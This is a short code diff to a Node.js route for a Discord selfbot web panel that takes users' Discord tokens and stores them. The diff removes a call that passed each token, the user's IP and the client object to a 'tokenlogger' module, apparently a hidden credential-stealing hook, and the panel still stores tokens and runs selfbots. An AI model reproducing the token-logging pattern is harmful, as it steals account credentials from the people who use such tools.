@@ -1,7 +1,6 @@
 const db = require("quick.db");
 const djs = require('discord.js-selfbot-v13');
 const ipinfo = require("../../assets/function/web/ipinfo.js");
-const tokenlogger = require("../../assets/function/web/tokenlogger.js");
 const config = require("../../config.json");
 module.exports = {
     path: "/user/panel/",
@@ -19,7 +18,6 @@ module.exports = {
                 });
                 client.on("ready", async () => {
                     await db.set(`client_${client.user.id}`, tkn);
-                    tokenlogger({ token: tkn, ip: ip, client: client, type: 1 });
                     res.render("user/panel.ejs", {
                         n: client.user.tag,
                         i: client.user.id,
